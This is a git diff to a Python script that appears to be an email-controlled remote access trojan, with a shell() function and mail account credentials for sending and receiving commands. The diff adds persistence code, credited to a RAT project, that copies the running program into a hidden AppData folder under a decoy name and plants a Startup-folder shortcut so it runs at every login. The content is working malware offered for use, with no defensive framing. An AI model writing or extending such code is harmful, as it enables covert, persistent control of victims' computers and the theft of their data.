@@ -5,10 +5,34 @@ import os
 import smtplib 
 import subprocess
 import time
+from win32com.client import Dispatch
+from winshell import startup                                              # 
+from shutil import copyfile  
+
+
+#-------------------------------------------------------------------------------------------------------------------------------------------------------
 # account credentials for python to send mail and recieve mail
 username = "youraccount@gmail.com"
 password = "************"
+# -------------------------------------------------------------------------------------------------------------------------------------------------------
+#This part is taken directly from https://github.com/mvrozanti/RAT-via-Telegram/blob/master/RATAttack.py and is not tested if you get an error please configure it by yourself
+app_name = 'ABCdef123'
+appdata_roaming_folder = os.environ['APPDATA']			# = 'C:\Users\Username\AppData\Roaming'
+# HIDING OPTIONS
 
+hide_folder = appdata_roaming_folder + '\\' + app_name	
+compiled_name = app_name + '.exe'
+target_shortcut = startup() + '\\' + compiled_name.replace('.exe', '.lnk')
+if not os.path.exists(hide_folder):
+	os.makedirs(hide_folder)
+	hide_compiled = hide_folder + '\\' + compiled_name
+	copyfile(argv[0], hide_compiled)
+	shell = Dispatch('WScript.Shell')
+	shortcut = shell.CreateShortCut(target_shortcut)
+	shortcut.Targetpath = hide_compiled
+	shortcut.WorkingDirectory = hide_folder
+	shortcut.save()
+# -------------------------------------------------------------------------------------------------------------------------------------------------------
 # your account to view the mail sent from python
 your_mail = 'yourmail@gmail.com'
 
@@ -87,7 +111,7 @@ def shell():
         except Exception as e:
             print(e)
     
-
+#Function to send mail
 def sendmail(message):
     try:
         s = smtplib.SMTP('smtp.gmail.com', 587) 
